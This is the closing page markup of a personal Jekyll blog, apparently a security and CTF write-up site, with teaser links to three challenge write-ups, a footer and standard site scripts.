href="/tags/sp00ky/">sp00ky</a> <a class="post-tag" href="/tags/tools/">tools</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Dodgy_Databases/"><div class="card-body"> <span class="timeago small" >Aug 17, 2021<i class="unloaded">2021-08-17T09:00:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Dodgy Databases</h3><div class="text-muted small"><p> Description: 1 2 One of our most senior engineers wrote this database code, it's super well commented code, but it does seem like they have a bit of a god complex. See if you can help them out. W...</p></div></div></a></div><div class="card"> <a href="/posts/Absolute_Dice/"><div class="card-body"> <span class="timeago small" >Aug 17, 2021<i class="unloaded">2021-08-17T10:00:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Absolute Dice</h3><div class="text-muted small"><p> Description: 1 Man, the final boss of this game is kickin' my ass! Can you give me a hand? We are given only the challenge executable and an IP:Port for the real exploit. Methodology Since we don‚Äô...</p></div></div></a></div><div class="card"> <a href="/posts/Packed/"><div class="card-body"> <span class="timeago small" >Aug 17, 2021<i class="unloaded">2021-08-17T15:30:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Packed</h3><div class="text-muted small"><p> Description: 1 2 Our team wants to use this Really Awesome Console Application, but they don't want to pay for it. Can you help them crack it and generate a license key for the username John Smith...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/Dodgy_Databases/" class="btn btn-outline-primary" prompt="Newer"><p>Dodgy Databases</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> ¬© 2024 <a href="https://twitter.com/1c3_B3ar">David Wolfe</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/3dart/">3dart</a> <a class="post-tag" href="/tags/blender/">blender</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/isu/">ISU</a> <a class="post-tag" href="/tags/portfolio/">portfolio</a> <a class="post-tag" href="/tags/project/">project</a> <a class="post-tag" href="/tags/ractf/">ractf</a> <a class="post-tag" href="/tags/sp00ky/">sp00ky</a> <a class="post-tag" href="/tags/tools/">tools</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
